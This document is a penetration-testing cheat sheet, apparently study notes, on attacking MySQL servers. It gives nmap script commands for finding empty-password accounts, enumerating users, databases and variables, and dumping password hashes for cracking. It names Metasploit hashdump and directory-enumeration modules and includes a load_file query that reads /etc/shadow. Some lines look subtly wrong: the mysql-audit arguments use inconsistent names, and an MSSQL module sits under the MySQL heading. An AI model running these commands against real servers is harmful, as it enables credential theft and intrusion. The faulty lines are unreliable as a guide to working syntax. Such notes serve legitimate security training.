
### Using `nmap` to enumerate accounts with NULL password

```
nmap -p 3306 -sV <target-IP> --script mysql-empty-password
```

### Using `nmap` to enumerate SQL server info

```
nmap -p 3306 -sV <target-ip> --script mysql-info
```

### Using `nmap` to enumerate users

```
nmap -p 3306 -sV <target-ip> --script mysql-users --script-args="mysqluser='root',mysqlpass=''"
```

### Using `nmap` to enumerate databases

```
nmap -p 3306 -sV <target-ip> --script mysql-databases --script-args="mysqluser='root',mysqlpass=''"
```

### Using `nmap` to enumerate variables

- Using the `mysql-variables` script to retrieve configuration and system information from the MySQL server:
```
nmap -p 3306 -sV <target-ip> --script mysql-variables --script-args="mysqluser='root',mysqlpass=''"
```

### Using `nmap` to perform audit on the SQL server

```
nmap -p 3306 -sV <target-ip> --script mysql-audit --script-args="mysqlaudit.username='root',mysql-audit.pass='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```

- The `mysql-audit` script in Nmap is designed to perform security audits on MySQL database servers by checking for compliance with specific security configurations, guidelines, or benchmarks.

### Using `nmap` to dump hashes

- Dumps the password hashes from an MySQL server in a format suitable for cracking by tools such as John the Ripper.
```
nmap -p 3306 <ip> --script mysql-dump-hashes --script-args='username=root,password=secret'
```

### Using `nmap` to run MySQL queries

```
nmap -p 3306 <ip> --script mysql-query --script-args="query='select count(*) from books.authors;',username='root',password='secret'"
```

### Using `metasploit` to enumerate directories
- Metasploit module to enumerate ***readable*** directories in the system using MySQL:
```
use auxiliary/scanner/mysql/mysql_file_enum
```

- Metasploit module to enumerate ***writable*** directories in the system using MySQL:
```
use auxiliary/scanner/mysql/mysql_writable_dirs
```

- **WordList path** - /usr/share/metasploit-framework/data/wordlists/directory.txt
- Set verbosity to `false` to avoid getting spammed with too many messages. 
- To show more options use command `advanced`
- Instead of using `set <RHOSTS>`, we can use `setg <RHOSTS>` to set it as a global variable, so that we don't have to set it again when we switch to another module.

**How does this module work ?**

This Metasploit module doesn't enumerate directories in the traditional sense but rather checks if MySQL has write access to specific directories by executing SQL queries that attempt to create temporary files in those directories. If the MySQL server has the necessary permissions and access rights, it will allow the creation of files in those directories.

### Using `metasploit` to dump schema

```
use auxiliary/scanner/mssql/mssql_schemadump
```

- A schema in a database is a container for database objects like tables, views, procedures, and functions.
### Using `sql_hashdump` module

- Metasploit module to collect the hashes of different users who have access to the MySQL server from the user account information stored in the `mysql.user` table:
```
use auxiliary/scanner/mysql/mysql_hashdump
```

### Using `mysql` to access sensitive files

- `mysql` command to access `/etc/shadow` file.
```
select load_file("/etc/shadow")
```

- *The `/etc/shadow` file keeps records about encrypted users' passwords, as well as other passwords related information.
